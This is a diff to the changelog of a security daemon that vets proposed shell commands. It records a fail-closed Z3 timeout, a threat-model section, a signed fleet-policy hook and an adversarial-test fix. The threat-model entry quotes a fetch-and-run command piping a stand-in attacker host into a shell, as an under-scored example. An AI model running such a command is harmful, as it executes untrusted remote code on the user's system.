@@ -6,9 +6,34 @@ validated research prototype / controlled-pilot MVP; see
 
 ## [Unreleased]
 
-Operability (moving toward pilot-ready).
+Operability and review-driven hardening (moving toward pilot-ready).
+
+### Security / hardening
+- **Z3 solver per-check timeout (250 ms), fail-closed.** The SMT solver now runs
+  under a bounded timeout so a pathological or maliciously complex policy cannot
+  stall a decision; on timeout Z3 returns `Unknown`, which is treated as **DENY**.
+- **`THREAT_MODEL.md` §8 "Threats to validity — the risk model."** Documents
+  honestly what the Z3 proof does and does *not* establish: the guarantee is
+  conditional on a heuristic risk classifier (default score 35; e.g.
+  `curl evil.com | sh` is under-scored), the risk/Z3 layer is defense-in-depth
+  rather than the primary gate (intent allowlist + kernel exec enforcement are),
+  and client-declared risk can only *raise* the score, never lower it. Adds
+  model-based scoring and interpreter child-process attribution to the open items.
 
 ### Added
+- **Signed fleet-policy client hook (`--fleet-policy-url`), gated behind the
+  `fleet` Cargo feature** (part of `--features enterprise`; **off by default**).
+  When built with the feature, the daemon can pull a signed, versioned
+  `PolicyBundle` from an external fleet control plane, verify its HMAC-SHA256
+  signature (`--fleet-secret-file`, default: admission secret), enforce rollback
+  protection (version must not regress), cache the last good bundle for offline
+  restart (`--fleet-policy-cache`), and hot-reload on change. Every failure path
+  keeps the current policy (fail-safe). Default public builds are **single-node**
+  and never reach the network for policy. The control-plane *server* that issues
+  these bundles is **not** in this repo — it lives in the private
+  `jinn-guard-enterprise` repo. This flag is the stable open-core integration
+  seam a fleet manager connects to. Validated end-to-end against the live daemon
+  (correct key applies v1→v2, wrong key rejected, offline cache written).
 - **Prometheus `/metrics` endpoint** (opt-in via `JINNGUARD_METRICS_PORT`,
   loopback-only). Dependency-free; exposes uptime, proposals, userspace
   allow/deny (with denial reasons), kernel-LSM allow/deny, and build info. Adds a
@@ -16,6 +41,24 @@ Operability (moving toward pilot-ready).
 - **`OPERATOR_RUNBOOK.md`** — install, configuration, operating modes, start/stop,
   monitoring, health checks, upgrade/rollback, incident response (disable
   enforcement fast), exit-code reference, and troubleshooting.
+- **Fleet accept/reject decision is now a pure, tested function**
+  (`fleet_policy::evaluate_bundle`). The daemon's refresh loop calls it, so the
+  unit tests cover the exact production path: apply-forward, reject-rollback
+  (version below the floor), reject-bad-signature, and already-applied no-op
+  (incl. rollback taking precedence over a bad signature). A new CI job (**Fleet
+  feature gate**) builds, clippy-checks, and runs these with `--features fleet`,
+  so the gated open-core client can't silently rot.
+
+### Fixed
+- **Adversarial harness binary auto-detection.** `tests/swarm_attack.rs` used to
+  hard-code `target/debug/ts_cli`, so the documented reproduce command
+  `cargo test --release --test swarm_attack` failed with a spurious
+  `No such file or directory` on a clean checkout unless `JINNGUARD_TEST_BINARY`
+  was set by hand. The harness now auto-detects the daemon binary (prefers the
+  test's own build profile, falls back to the other), so both `cargo test` and
+  `cargo test --release` work out of the box; the env var still overrides.
+  Verified on a second host (Azure Debian 13 / Xeon): 12/12 adversarial tests
+  pass, 0 fail-open.
 
 ## [v1.0.0-rc2] — 2026-06-11
 
